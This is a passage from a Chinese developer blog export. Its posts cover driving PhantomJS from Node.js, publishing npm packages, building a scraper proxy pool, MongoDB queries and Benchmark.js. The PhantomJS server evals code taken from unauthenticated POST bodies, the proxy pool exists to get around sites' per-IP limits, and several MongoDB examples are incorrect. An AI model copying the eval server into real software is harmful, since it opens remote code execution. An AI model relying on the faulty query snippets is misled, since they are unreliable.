服务器模块Web 服务器模块，使用名为 Mongoose （不是 Mongodb 数据库模块）的嵌入式 Web 服务器模块，目前有一个10 个并发请求的限制，超过需要排队。 下面创建了一个 HTTP 服务，监听 8080 端口，在浏览器上访问 http://127.0.0.1:8080 可以看到输出 Hello!。 12345678var webserver = require('webserver');var server = webserver.create();var service = server.listen(8080, function(req, res) &#123; res.statusCode = 200; res.write('&lt;html&gt;&lt;body&gt;Hello!&lt;/body&gt;&lt;/html&gt;'); res.close();&#125;); request 有以下几个属性： method 定义请求方法（GET，POST 等） url 请求 URL 的路径部分和查询字符串部分（如果有） httpVersion HTTP 版本 headers HTTP 头作为键值对 post 请求体（仅用于 POST 和 PUT 方法请求） postRaw 如果 Content-Type 设置为 application/x-www-form-urlencoded（默认为表单提交），则原始内容 post 将存储在此额外的属性（postRaw）中，然后 post 将自动更新为 URL 解码的数据。 response 有以下几个属性： headers HTTP 头作为键值对，这必须在首次调用 write 之前设置 setHeader(name, value) 设置一个特定的 header 属性 header(name) 返回给定 header 属性的值 statusCode 设置返回的 HTTP 状态代码 setEncoding(encoding) 指示用于转换给定的数据的编码 write()。默认情况下，数据将转换为 UTF-8。 write(data) 为响应体发送一个块，可多次调用，数据会按照字符串拼接。 writeHead(statusCode, headers) 向请求发送响应头。状态代码是 3 位 HTTP 状态代码（例如 404）。 close() 关闭 HTTP 连接。为了避免客户端检测到连接丢失，请记住 write() 至少使用一次。如果唯一的目的是返回 200 的 HTTP 状态代码，则发送空字符串就行了。 closeGracefully() 与之相同 close()，但确保响应头已经被发送（至少要做一个res.write(&#39;&#39;)） Phantomjs 与 Nodejs 通信上面的代码看似类似 Nodejs 的代码，但是这与 Nodejs 是没有任何的关系的。使用 phantomjs 执行的是一个 Phantomjs 应用，使用 node 执行的是一个 Nodejs 应用，它们两个是属于不同的进程 。 一般来说，我们使用 Nodejs 来编写代码，使用 Phantomjs 类加载页面，这就涉及一个跨应用通信的问题。 我通过在 Phantomjs 里创建一个HTTP服务，在 Nodejs 通过Fetch来进行通信，具体看下面的设计。 首先，在 Phantomjs 里创建一个 HTTP 服务，当接收的请求 method 为 POST 的时候，把 POST 中的数据 JSON 解析，再把 code 提取出来执行，并把res, req, page作为参数传递使用。 123456789101112131415161718192021222324252627// phantomjs server.jsvar webserver = require('webserver');var server = webserver.create();var page = require('webpage').create();var service = server.listen(8080, function (req, res) &#123; var text = 'Hello'; if (req.method === 'POST') &#123; var body = JSON.parse(req.post); var func = ''; // 要执行的函数 if (typeof body.code === 'string') &#123; eval('(func = ' + body.code + ')'); if (typeof func === 'function') &#123; // 把 req, res, page 作为参数 func(req, res, page); &#125; &#125; &#125; if (!res.state) &#123; // res.state 决定是否需要自动的 res.write res.statusCode = 200; res.write(text); res.close(); &#125;&#125;); 那么code到底是什么？为了方便编写，code 就是从 Nodejs 传递过来的执行函数，并为它提供 req, res, page 上下文，利用 eval 来构造（也可以用 new Function 来构造）。 再来看看 Nodejs 那边怎么写。 123456789101112131415161718// node index.jsconst fetch = require('node-fetch');fetch('http://127.0.0.1:8080/', &#123; method: 'POST', body: JSON.stringify(&#123; code: (function (req, res, page) &#123; res.state = true; res.statusCode = 200; res.write('Hello world!'); // &lt;--- 1 res.close(); &#125;).toString(), // 函数转为字符串 &#125;),&#125;) .then(res =&gt; res.text()) .then(html =&gt; &#123; console.log(html); // &lt;--- 2 &#125;); code 是一段在 Phantomjs 里执行的代码（不是在 Nodejs 里执行的），所以需要把它序列化为字符串传递过去。为了方便编写而不使用字符串模版方式，这里巧妙的使用了 Function.prototype.toString 的特性：函数的 toString 是函数的源码。 res.state 是一个自定义的属性，主要用来决定是否需要自动的 res.write。 req, res, page 是从 Phantomjs 提供的上下文，因此可以直接拿来使用。 上面的数据最终会从 1 处响应，在 2 处获取。 此时，运行后可以看到输出是 ‘Hello world!’ 而不是 ‘Hello’。 示例 - 抓取腾讯天气网天气信息腾讯天气 有非常不错的天气信息，如果你想通过爬虫的方式来抓取，可能常规的方式不行。因为是它的数据是通过 js 动态加载的，在异步数据还没有返回时，可以从源码看到，html 只是留了一个结构。 为此，需要使用 Phantomjs 来加载页面，等待页面加载完毕后，改渲染的数据渲染上去了，再进行数据的筛选。 Phantomjs 的代码还是用上面的，这里只需要修改 Nodejs 的代码。 1234567891011121314151617181920212223242526272829303132333435363738const fetch = require('node-fetch');fetch('http://127.0.0.1:8080/', &#123; method: 'POST', body: JSON.stringify(&#123; code: (function (req, res, page) &#123; res.state = true; var url = 'http://weather.news.qq.com/'; page.open(url, function (status) &#123; console.log('status:', status); var data = page.evaluate(function () &#123; var $box = $('#cur-box'); var _data = &#123; city: $box.find('.city.yh').text(), // 城市 date: $box.find('span.full-date').text(), // 时间 wd: $box.find('.w-wd').text(), // 温度 sd: $box.find('.w-sd').text(), // 湿度 zl: $box.find('.w-zl').text(), // 质量 aqi: $box.find('.w-aqi ').text(), // aqi pm: $box.find('.w-pm').text(), // pm2.5 &#125;; return _data; &#125;); res.statusCode = 200; // &lt;-- 发对象，Phantomjs 会报错，需要序列化为字符串 res.write(JSON.stringify(data)); res.close(); &#125;); &#125;).toString(), &#125;),&#125;) .then(res =&gt; res.text()) .then(data =&gt; &#123; console.log(data); &#125;); 结果： 123456789&#123; \"city\": \"广州\", \"date\": \"2017.10.07 星期六 农历八月十八\", \"wd\": \"多云 30℃\", \"sd\": \"东北风2级 湿度：65%\", \"zl\": \"空气质量：良\", \"aqi\": \"AQI：69\", \"pm\": \"PM2.5：40\"&#125; 站在巨人的肩膀上：phantom-node在 npm 有位开发者已经编写了一个 phantom npm 包，可以很轻易的在 Nodejs 里使用 Phantomjs。并且支持 async、await。它的原理，是使用 sysin 和 sysout 管道与 phantomjs 进程进行通信。 安装： 1npm install --save phantom 抓取腾讯天气网天气信息： 12345678910111213141516171819202122(async function () &#123; const instance = await phantom.create(); const page = await instance.createPage(); const status = await page.open('http://weather.news.qq.com/'); const data = await page.evaluate(function() &#123; var $box = $('#cur-box'); var _data = &#123; city: $box.find('.city.yh').text(), // 城市 date: $box.find('span.full-date').text(), // 时间 wd: $box.find('.w-wd').text(), // 温度 sd: $box.find('.w-sd').text(), // 湿度 zl: $box.find('.w-zl').text(), // 质量 aqi: $box.find('.w-aqi ').text(), // aqi pm: $box.find('.w-pm').text(), // pm2.5 &#125;; return _data; &#125;); console.log(data); await instance.exit();&#125;)(); 使用代理12345678// 使用代理 https://github.com/amir20/phantomjs-node/pull/502(async () =&gt; &#123; let page = await phantom.createPage(); await page.setProxy('http://localhost:8888'); await page.open('http://phantomjs.org/'); let text = await page.property('plainText'); expect(text).toEqual('hi, http://phantomjs.org/');&#125;)(); Phantomjs 应用场景Phantomjs 的适用范围就是无头浏览器的适用范围。 自动化测试：希望自动的登陆网站并做一些操作然后检查结果是否正常，可以结合 selenium 来使用。 网页监控：希望定期打开页面，检查网站是否能正常加载，加载结果是否符合预期，加载速度如何等。 网络爬虫：SPA，Ajax 动态加载数据的克星。破解四种反爬虫 不足： Phantomjs 是一个阉割版的 webkit，不支持 flash、webGL、video/audio、css3d、WebRTC 等。 Phontomjs 不想背负操作系统强相关的特性，跨平台比较困难。 如果使用 Page 模块的 onResourceReceived() 方法监听页面收到的请求资源，是无法得到该资源的 response.body 的 参考资料 http://phantomjs.org/documentation/ https://github.com/amir20/phantomjs-node https://www.qcloud.com/community/article/743451001489391682","categories":[{"name":"爬虫","slug":"爬虫","permalink":"http://me.lizhooh.com/categories/爬虫/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"爬虫","slug":"爬虫","permalink":"http://me.lizhooh.com/tags/爬虫/"}]},{"title":"NPM：发布第一个模块包","slug":"Nodejs/NPM/NPM 发布第一个模块包","date":"2017-10-06T10:38:46.000Z","updated":"2021-06-15T06:10:52.836Z","comments":true,"path":"/stories/2017/10/Nodejs/NPM/NPM 发布第一个模块包/","link":"","permalink":"http://me.lizhooh.com/stories/2017/10/Nodejs/NPM/NPM 发布第一个模块包/","excerpt":"发布第一个 npm 包终于发布了一个 npm 包。 react-static-view，是一个 react/react-native 静态组件容器，提供渲染次数控制的功能，可以用于性能优化，减少不必要的渲染。 下面记录一下，发布一个 npm 包，需要解决的问题： 如何登录 npm 账号，创建 npm 模块，发布 npm 模块，更新 npm 模块，添加版本，下载量信息等。","text":"发布第一个 npm 包终于发布了一个 npm 包。 react-static-view，是一个 react/react-native 静态组件容器，提供渲染次数控制的功能，可以用于性能优化，减少不必要的渲染。 下面记录一下，发布一个 npm 包，需要解决的问题： 如何登录 npm 账号，创建 npm 模块，发布 npm 模块，更新 npm 模块，添加版本，下载量信息等。 登录 npm如果没有 npm 账号，先是在 npm 上注册一个账号。接着使用命令登录： 1npm login 注意：如果之前使用了 “淘宝源” 的 npm 镜像，在这里需要转回使用官方镜像，不然在发布包时会使劲报错。 123npm config set registry https://registry.npm.taobao.org/ # 淘宝源npm config set registry https://r.cnpmjs.org/ # cnpm 源npm config set registry https://registry.npmjs.org/ # 官方源 登录完成后，可以使用下面命令来检测是否登录成功，它会显示出当前登录用户的名称： 1npm who am i # lizhooh 创建模块创建 npm 模块，使用 npm init 即可。npm 的包结构使用一个 package.json 来描述，实际上是一个存档文件，即一个目录直接打包为 .zip 或 tar.gz 格式的文件，安装后解压还原为目录。 一般来说有以下目录结构：package.json 包描述文件（必须）bin 用于存放可执行二进制文件的目录（非必须）lib 用于存放 javascript 代码的目录（非必须）doc 用于存放文档的目录（非必须）test 用于存放单元测试用例的代码（非必须） 注意：在 package.json 里，repository 一定要写，可以先在 github 上创建项目之后再创建 npm 包。keywords 是关键词，为了方便别人搜索到你的包，建议填写准确，多个之间使用 , 分割。 如何指定入口文件？在 package.json 里指定：&quot;main&quot;: &quot;index.js&quot; 发布包创建完包，之后就可以发布包了。 使用 npm publish 命令： 1npm publish &lt;包名&gt; 注意：npm 包名是唯一的，因此需要一个没有人使用过的包名。比如，test 已经有人使用了，就不能使用 test 了。（test-test4 都被人使用了，滑稽）。version 必须比上次的大，不然报错。还有一点要注意的是 npm 对包名的限制：不能有大写字母/空格/下滑线。 如果报错：’xxx’ is not in the npm registry，把包名去掉。 发布之后可以使用命令 npm info 来查看发布包信息。 撤销包只有发布的包在 24 小时之内是可以撤销的，可以使用： 1npm unpublish &lt;包名&gt; 更新模块更新模块还是使用 npm publish 来更新。 先是修改 package.json 中的 version 版本（必须比上次的大），接着使用 npm publish 来更新。 如果不想手动修改 version，可以使用 npm version &lt;update_type&gt; 来更新版本。 update_type 是指语义化版本管理的发布类型的一种：补丁版本（patch）、次版本（minor）或主版本（major）。此命令会更改 package.json 中的版本号。注意哦，如果你有此包的 git 仓库，那么此命令也会向 git 仓库添加此版本的一个标签。 更新版本号需要注意的地方： 如果项目将要与他人分享，那它的版本应该始于 1.0.0，尽管 npm 上有些项目不遵循此规则。 Bug 修复和其他小版本修改：用 Patch 版本，增加最后的版本数，如：1.0.1 不会破坏已有特性的新特性：用 Minor 版本，增加中间的版本数，如：1.1.0 会破坏向后兼容的更改：用 Majo 版本，增加第一个版本数，如：2.0.0 添加版本，下载量信息类型下面的效果： 把下面的 react-router 改为你的包名，添加到 readme.md 里就可以了。 123456&lt;a href=\"https://www.npmjs.com/package/react-router\"&gt; &lt;img src=\"https://img.shields.io/npm/v/react-router.svg?style=flat-square\"&gt;&lt;/a&gt;&lt;a href=\"https://www.npmjs.com/package/react-router\"&gt; &lt;img src=\"https://img.shields.io/npm/dm/react-router.svg?style=flat-square\"&gt;&lt;/a&gt; 具体参考： https://shields.io/ 遇到问题说，没有限权，可能是账号没有登对，可能是包名与别人的重复了，可能是使用了淘宝源。 1no_perms Private mode enable, only admin can publish this module 没有登录，请重新登录一次。 1npm publish failed put 500 unexpected status code 401 如果，不小心写错了，又发布了新的版本。如何撤销当前版本？不能撤销版本，只能再发布一个新的版本。","categories":[{"name":"NPM","slug":"NPM","permalink":"http://me.lizhooh.com/categories/NPM/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"NPM","slug":"NPM","permalink":"http://me.lizhooh.com/tags/NPM/"}]},{"title":"Nodejs 里建立 ip 代理池","slug":"Nodejs/Nodejs 里建立 ip 代理池","date":"2017-10-03T07:10:02.000Z","updated":"2021-06-15T06:10:52.841Z","comments":true,"path":"/stories/2017/10/Nodejs/Nodejs 里建立 ip 代理池/","link":"","permalink":"http://me.lizhooh.com/stories/2017/10/Nodejs/Nodejs 里建立 ip 代理池/","excerpt":"前言ip 代理池，在写爬虫时，面对一些限制 ip 访问次数的站点非常有用，这样就可以进行代理 ip 轮转去访问目标网址。（滑稽 补充：爬虫使用代理时需要注意安全性问题。比如说，抓取知乎信息，需要模拟登录，在代理中模拟登录的账号密码，Cookie，可能会被窃取。谨慎，谨慎，可以开小号。","text":"前言ip 代理池，在写爬虫时，面对一些限制 ip 访问次数的站点非常有用，这样就可以进行代理 ip 轮转去访问目标网址。（滑稽 补充：爬虫使用代理时需要注意安全性问题。比如说，抓取知乎信息，需要模拟登录，在代理中模拟登录的账号密码，Cookie，可能会被窃取。谨慎，谨慎，可以开小号。 如何使用代理 ip首先需要有一个可以进行代理的 ip 地址，之后在请求体里进行指定代理。 下面介绍 node-fetch，request 如何进行代理： 123456789101112131415161718192021const fetch = require('node-fetch');const HttpsProxyAgent = require('https-proxy-agent');const request = require('request');const targetUrl = 'https://www.baidu.com';const proxyUrl = 'http://123.123.123.123:8888';// fetchfetch(targetUrl, &#123; method: 'GET', // 根据情况而定 agent: new HttpsProxyAgent(proxyUrl),&#125;);// requestrequest(&#123; method: 'GET', url: targetUrl, proxy: proxyUrl,&#125;, function (error, response, body) &#123; //&#125;); 没使用代理：你的地址 -&gt; 目标地址使用代理后：你的地址 -&gt; 代理地址 -&gt; 目标地址 ip 代理池在建立一个 ip 代理池，需要几个步骤： 查找代理 ip 地址（免费、收费） 检验是否有效 保存有效代理 ip 地址 因为，代理 ip 的有效性是有时效的，所以需要在一定时间内重新进行检验。 查找代理 ip 地址在这里，我使用了几个个免费的代理 IP 网站： http://www.66ip.cn/ http://www.89ip.cn/api/ https://www.xicidaili.com/nt/ http://www.xicidaili.com/ http://ip.zdaye.com/ 也可以去使用收费的代理商，免费的特点就是不稳定，延迟高，过几分钟就失效，而收费的特点是稳定，几乎一天都不失效。 参考：说说代理 IP 哪家好？ 检验有效性虽然说，在上面的网站里，显示了都是通过检验的 ip 地址，但是可能在你的电脑上会失效，最终还是要自己检验一次。 下面使用了站长之家的 ip 检验。 12345678910111213141516171819202122232425const got = require('got');const tunnel = require('tunnel');// 获取真实的 ip 地址，也可以用于检查async function getRealIp(host, port) &#123; try &#123; const res = await got('http://ip.tool.chinaz.com', &#123; agent: tunnel.httpOverHttp(&#123; proxy: &#123; host: host, port: port, &#125;, &#125;), timeout: 1000 * 5, &#125;); const $ = cheerio.load(res.body); const ip = $('.fz24').text(); const address = $('.IpMRig-tit dd').eq(1).text().replace(/\\(纠错\\)/g, ''); return &#123; ip, address &#125;; &#125; catch (err) &#123; return false; &#125;&#125; 下面是运行的结果： 批量获取123456789101112131415161718192021222324252627282930313233343536373839const got = require('got');const Async = require('async');const cheerio = require('cheerio');const fs = require('fs');// 返回一个 ip 代理数组async function getProxyIps() &#123; const start = Date.now(); const res = await got('https://www.xicidaili.com/nt/'); const $ = cheerio.load(res.body); const list = $('#ip_list tbody &gt; tr').toArray().map((item) =&gt; &#123; const $item = $(item); return &#123; host: $item.find('td').eq(1).text(), port: $item.find('td').eq(2).text() * 1, type: $item.find('td').eq(5).text(), time: Date.now() - start, &#125;; &#125;); return list;&#125;// 批量检查 ip 代理是否有效async function checkIps(arr = []) &#123; return new Promise(resolve =&gt; &#123; Async.timesLimit(arr.length, 100, (index, next) =&gt; &#123; + async function () &#123; const res = await getRealIp(arr[index].host, arr[index].port); console.log(res); next(null, res ? &#123; ...res, ...arr[index] &#125; : false); &#125;(); &#125;, (err, res) =&gt; &#123; const list = res.filter(i =&gt; !!i); fs.writeFileSync('./json/test.json', JSON.stringify(list, null, 3)); resolve(list); &#125;); &#125;);&#125; 存储这里使用本地 json 数据存储方式进行存储有效了 ip 地址（当然也可以存数据库，不过没这个必要）。 使用一个 json 本地文件数据库 diskdb，它是一个小型的 json 数据库（实际上就是 JSON + fs 的封装）。使用它的第一步是连接，这时候它会把 json 文件的内容读到内存里，每一次进行插入或更新操作，它都会把数据写到 json 文件里。 12345678910111213141516171819202122const db = require('diskdb');const mkdirs = require('mkdirs');mkdirs('./store/');db.connect('./store', ['proxy-ips']); // 自动创建 ./store/proxy-ops.json// 插入数据db['proxy-ips'].insert(&#123; ip: '123.123.123.123:8888', address: '美国', checkTime: Date.now(), // 记录一下检查时间&#125;);// 之后在 ./store/proxy-ops.json 里，应该可以看到：[ &#123; \"ip\": \"123.123.123.123:8888\", \"address\": \"美国\", \"checkTime\": 1508373413027, \"_id\": \"75def933f6974d68910429c0dcf022f9\" &#125;] 说明：免费的就是坑爹，存了 10 分钟，一大半失效了。 参考资料 https://zhuanlan.zhihu.com/p/25285987","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"MongoDB 查询文档（Find）","slug":"MongoDB/MongoDB 查询文档（Find）","date":"2017-09-30T12:05:35.000Z","updated":"2021-06-15T06:10:52.827Z","comments":true,"path":"/stories/2017/09/MongoDB/MongoDB 查询文档（Find）/","link":"","permalink":"http://me.lizhooh.com/stories/2017/09/MongoDB/MongoDB 查询文档（Find）/","excerpt":"查询文档在 MongoDB 中查询文档的操作还是挺灵活的。 findfind 是 MongoDB 最基本的查询 API，它的形式是： 1234db.collection.find( &lt;query filter&gt;, &lt;projection&gt;,)","text":"查询文档在 MongoDB 中查询文档的操作还是挺灵活的。 findfind 是 MongoDB 最基本的查询 API，它的形式是： 1234db.collection.find( &lt;query filter&gt;, &lt;projection&gt;,) find 的第一个参数是查询对象，第二个参数是输出对象。 查询条件MongoDB 的查询条件默认是等值查询并且是且查询。 1db.collection.find(&#123; name: 'jog', age: 20 &#125;); 除了等值查询，还支持多种类型的查询，甚至是正则表达式。 12345678910111213// 正则查询db.collection.find(&#123; name: /$jog/ &#125;);// 范围查询db.collection.find(&#123; age: &#123; $gt: 20, $lt: 30 &#125; &#125;);// 或查询db.collection.find(&#123; age: &#123; $or: [24, 28] &#125; &#125;);// In 查询，年龄是 24, 25, 26 都匹配db.collection.find(&#123; age: &#123; $in: [24, 25, 26] &#125; &#125;);// and 和 ordb.collection.find(&#123; name: 'jog', $or: [ &#123; age: 20 &#125;, &#123; name: 'bao' &#125; ] &#125;);// 内嵌文档查询db.collection.find(&#123; 'auther.name': 'ber' &#125;);db.collection.find(&#123; auther: &#123; name: 'ber' &#125;&#125;); 数组查询MongoDB 的数据结果支持数组，对于数组的查询比较负责一些。数组查询默认是精准等值匹配。 123456789101112// 精准匹配db.collection.find(&#123; badges: [ \"blue\", \"black\" ] &#125;);// 一个元素，has 查询db.collection.find(&#123; badges: 'black' &#125;);// 指定位置查询db.collection.find(&#123; 'badges.0': 'black' &#125;);// 未指定位置db.collection.find(&#123; 'badges.$': 'black' &#125;);// 复合条件则使用 $elemMatch，至少包含 15-30db.users.find(&#123; finished: &#123; $elemMatch: &#123; $gt: 15, $lt: 20 &#125; &#125; &#125;);// 如果 finished 的元素是数字，则可以使用范围ab.collection.find(&#123; finished: &#123; $gt: 15, $lt: 20 &#125; &#125;); 其他 APIfindOne与 find 不同的是，findOne 不会返回数组而是返回一个文档。 findOneAndDeletefindOneAndDelete：找到后并删除。 123456789db.collection.findOneAndDelete( &lt;filter&gt;, &#123; projection: &lt;document&gt;, sort: &lt;document&gt;, maxTimeMS: &lt;number&gt;, collation: &lt;document&gt; &#125;) findOneAndReplacefindOneAndReplace：找到后并替换。 123456789101112db.collection.findOneAndReplace( &lt;filter&gt;, &lt;replacement&gt;, &#123; projection: &lt;document&gt;, sort: &lt;document&gt;, maxTimeMS: &lt;number&gt;, upsert: &lt;boolean&gt;, returnNewDocument: &lt;boolean&gt;, collation: &lt;document&gt; &#125;) findOneAndUpdatefindOneAndUpdate：找到之后并更更新。 12345678910111213db.collection.findOneAndUpdate( &lt;filter&gt;, &lt;update&gt;, &#123; projection: &lt;document&gt;, sort: &lt;document&gt;, maxTimeMS: &lt;number&gt;, upsert: &lt;boolean&gt;, returnNewDocument: &lt;boolean&gt;, collation: &lt;document&gt;, arrayFilters: [ &lt;filterdocument1&gt;, ... ] &#125;) findAndModifyfindAndModify 是一个比较全能的 API，findAndModify 的作用在一个文档内保存原子操作，下面将会好好介绍它。 findAndModify 的作用是查询并修改，默认返回查询到数据，它的整个结构是： 12345678910111213db.collection.findAndModify(&#123; query: &lt;document&gt;, sort: &lt;document&gt;, remove: &lt;boolean&gt;, update: &lt;document&gt;, new: &lt;boolean&gt;, fields: &lt;document&gt;, upsert: &lt;boolean&gt;, bypassDocumentValidation: &lt;boolean&gt;, writeConcern: &lt;document&gt;, collation: &lt;document&gt;, arrayFilters: [ &lt;filterdocument1&gt;, ... ]&#125;); 属性 说明 query 查询对象。 sort 如果查询结果有很多，可以对其进行排序，findAndModify 只修改排第一个的。 remove 必须指定 remove 或 update。删除匹配的文档。 update 更新匹配的文档。 new new 为 true 时，返回的是修改后的数据，而不是查询到的数据。 fields 要返回的字段的子集。 upsert update + insert 的玩法。 maxTimeMS 指定处理操作的时间限制。 下面代码的意思是，当先查询 20 &lt; count &lt; 30 时，把 count 自增加一。如果匹配很多结果，findAndModify 只会对一个文档进行修改。 12345678db.collection.findAndModify(&#123; query: &#123; count: &#123; $gt: 20, $lt: 30 &#125; &#125;, update: &#123; $inc: count, &#125;&#125;); 查询性能指标MongoDB 提供 explain 方法来获取查询性能指标的信息。 1db.collection.find(&#123; &#125;).explain(); 实际上 explain 的参数是接收一个字符串表示性能指标的信息。它有三个值：”queryPlanner”（完成信息），”executionStats”（统计信息），”allPlansExecution”（全部信息）。 查询性能优化创建索引加速查询。1db.posts.createIndex(&#123; name : 1 &#125;); 限制查询结果的数量，以减少网络请求数据大小。1db.collection.find().limit(20); 查询只返回需要的字段，以减少网络请求数据大小。1db.collection.find(&#123; &#125;, &#123; name: 1, _id: 0 &#125;); 使用 $hint 选择一个特定的索引。1db.users.find().hint(&#123; age: 1 &#125;); 使用增量运算符来执行（$inc）增量操作。1234db.products.update( &#123; sku: \"abc123\" &#125;, &#123; $inc: &#123; quantity: -1 &#125; &#125;,); 参考资料 https://docs.mongodb.com/manual/tutorial/query-documents/","categories":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/categories/MongoDB/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/tags/MongoDB/"},{"name":"NoSQL","slug":"NoSQL","permalink":"http://me.lizhooh.com/tags/NoSQL/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"}]},{"title":"测试那些事：使用 benchmark 进行基准测试","slug":"测试/基准测试/测试那些事：使用 benchmark 进行基准测试","date":"2017-09-25T14:56:18.000Z","updated":"2021-06-15T06:10:52.920Z","comments":true,"path":"/stories/2017/09/测试/基准测试/测试那些事：使用 benchmark 进行基准测试/","link":"","permalink":"http://me.lizhooh.com/stories/2017/09/测试/基准测试/测试那些事：使用 benchmark 进行基准测试/","excerpt":"前言基准测试是什么，标准的定义是：基准测试（benchmarking）是一种测量和评估软件性能指标的活动。你可以在某个时候通过基准测试建立一个已知的性能水平（称为基准线），当系统的软硬件环境发生变化之后再进行一次基准测试以确定那些变化对性能的影响。这是基准测试最常见的用途。其他用途包括测定某种负载水平下的性能极限、管理系统或环境的变化、发现可能导致性能问题的条件，等等。","text":"前言基准测试是什么，标准的定义是：基准测试（benchmarking）是一种测量和评估软件性能指标的活动。你可以在某个时候通过基准测试建立一个已知的性能水平（称为基准线），当系统的软硬件环境发生变化之后再进行一次基准测试以确定那些变化对性能的影响。这是基准测试最常见的用途。其他用途包括测定某种负载水平下的性能极限、管理系统或环境的变化、发现可能导致性能问题的条件，等等。 除此之外，在 Nodejs 测试方面包括了： 单元测试（测试那些事：使用 Jest 进行单元测试） 基准测试（本文） 集成测试 覆盖测试 压力测试（使用 Apach ab 对 Nodejs 进行并发负载的压力测试） 因此我们可以使用benchmark做这样的事情： 比如，当我们想比较 RegExp 的test方法和 String 对象的indexOf方法查找字符串谁的速度更快的话，js 代码在不同的浏览器，不同的操作系统环境运行的效率可能是不一样的，这就是为什么我们需要对其进行基准测试，在做基准测试方面，我们可以使用 Benchmark.js。 开始要使用 benchmark，我们先来安装它： 123456# 在 nodejs 上npm install --save benchmark# 在浏览器上&lt;script src=\"lodash.js\"&gt;&lt;/script&gt; # 工具相关&lt;script src=\"platform.js\"&gt;&lt;/script&gt; # 平台相关&lt;script src=\"benchmark.js\"&gt;&lt;/script&gt; # 基准测试 下面是 benchmark 的示例代码： 12345678910111213141516171819202122const Benchmark = require('benchmark');const colors = require('colors');const suite = new Benchmark.Suite;// add testssuite .add('RegExp - test'.green, function () &#123; /o/.test('Hello World!'); &#125;) .add('String - indexOf'.green, function () &#123; 'Hello World!'.indexOf('o') &gt; -1; &#125;) .add('String - match'.green, function () &#123; !!'Hello World!'.match(/o/); &#125;) .on('cycle', function (event) &#123; console.log(String(event.target)); &#125;) .on('complete', function () &#123; console.log('Fastest is '.red + this.filter('fastest').map('name')); &#125;) .run(&#123; async: true &#125;); 测试的结果是：indexOf 最快。 注意：在 benchmark 里并不会校验每个测试项的输出是否正确，那么需要确保每个测试项的输出是相同的。 fibonacci 数列实现的性能我们通过不同的方法实现了 fibonacci 数列，但是到底哪个是性能最好的呢？这样使用 benchmark 进行基准测试。 准备了以下四种实现方法： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// 使用 \"生成器\" 来实现function fibGen(n) &#123; function* fibonacci() &#123; let fib = [0, 1]; yield fib[0]; yield fib[1]; while (true) &#123; fib = [fib[1], fib[0] + fib[1]]; yield fib[1]; &#125; &#125; const gen = fibonacci(); new Array(n).fill(' ').map(i =&gt; gen.next()); return gen.next().value;&#125;// 递归实现function fibDeep(n) &#123; const fibonacci = n =&gt; &#123; if (n === 0 || n === 1) return n; return fibonacci(n - 1) + fibonacci(n - 2); &#125; return fibonacci(n);&#125;// 数组实现function fibArr(n) &#123; let fibonacci = [0, 1]; for (let i = 2; i &lt;= n; i++) &#123; fibonacci[i] = fibonacci[i - 1] + fibonacci[i - 2]; &#125; return fibonacci[n];&#125;// 数组实现 + 备忘模式（缓存模式）function fibArrCache(n) &#123; if (fibArrCache.cache[n]) return fibArrCache.cache[n]; let fibonacci = [0, 1]; for (let i = 2; i &lt;= n; i++) &#123; fibonacci[i] = fibonacci[i - 1] + fibonacci[i - 2]; &#125; fibArrCache.cache[n] = fibonacci[n]; return fibonacci[n];&#125;// 静态方法fibArrCache.cache = []; 开始测试： 1234567891011121314151617181920suite .add('fibGen - 20'.padEnd(18, ' ').green, function () &#123; fibGen(20); &#125;) .add('fibDeep - 20'.padEnd(18, ' ').green, function () &#123; fibDeep(20); &#125;) .add('fibArr - 20'.padEnd(18, ' ').green, function () &#123; fibArr(20); &#125;) .add('fibArrCache - 20'.padEnd(18, ' ').green, function () &#123; fibArrCache(20); &#125;) .on('cycle', function (event) &#123; console.log(String(event.target)); &#125;) .on('complete', function () &#123; console.log('Fastest is '.red + this.filter('fastest').map('name')); &#125;) .run(&#123; async: true &#125;); 果然，最快是数组 + 缓存。 ES6 解构语法测试 ES6 解构语法性能。 123456789101112131415161718192021222324let list1 = [], list2 = [];let obj1 = &#123;&#125;, obj2 = &#123;&#125;;// 1000for (let i = 0; i &lt; 1e3; i++) &#123; list1.push(Math.random * 1000 | 0); list2.push(Math.random * 1000 | 0); obj1[i] = Math.random * 1000 | 0; obj2[i] = Math.random * 1000 | 0;&#125;suite .add('Array concat'.green, function () &#123; let res = list1.concat(list2); &#125;) .add('Array destructuring'.green, function () &#123; let res = [...list1, ...list2]; &#125;) .add('Object assgin'.green, function () &#123; let res = Object.assign(obj1, obj2); &#125;) .add('Object destructuring'.green, function () &#123; let res = &#123; ...obj1, ...obj2 &#125;; &#125;) 测试结果： 不测还不知道，ES6 数组解构比 concat 慢这么多，几乎是 20 倍。 异步测试如果要进行异步测试，直接在回调函数里使用 async/await 即可： 123.add('fetch', async function () &#123; await fetch('http://127.0.0.1');&#125;) 数组复制数组复制，最常用的就是 slice(0)，除了 slice 还有 concat，for，甚至是 …。 12345678910111213141516suite .add('slice', function () &#123; let res = data.slice(); &#125;) .add('concat', function () &#123; let res = data.concat([]); &#125;) .add('for', function () &#123; let res = []; for (let i = 0, len = data.length; i &lt; len; i++) &#123; res[i] = data[i]; &#125; &#125;) .add('...', function () &#123; let res = [...data]; &#125;); 基准结果： 1234slice x 395,925 ops/sec ±0.91% (87 runs sampled)concat x 675,662 ops/sec ±4.03% (84 runs sampled)for x 100,621 ops/sec ±3.68% (82 runs sampled)... x 18,616 ops/sec ±0.52% (94 runs sampled) 